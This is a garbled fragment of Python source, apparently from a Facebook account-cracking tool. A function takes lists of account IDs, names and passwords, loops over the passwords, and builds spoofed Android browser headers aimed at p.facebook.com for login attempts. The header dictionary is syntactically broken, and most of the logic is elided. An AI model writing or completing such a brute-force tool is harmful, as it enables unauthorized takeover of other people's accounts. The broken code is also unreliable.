...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        head = {'Host': 'p.facebook.com','content-length':'2069',
'sec-fetch-dest': 'empty','sec-ch-ua-platform':'"Android"','sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'x-requested-with':'XMLHttpRequest
','user-agent':' Mozilla/5.0 (Linux; Android 10; TECNO KE5j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36','x-response-format':'JSONStream','content-type':'application/x-www-form-urlencoded','accept': */*,'origin':'https://p.facebook.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','referer':'https://p.facebook.com/','accept-encoding':'gzip','deflate, br','accept-language':'en-US,en;q=0.9'}
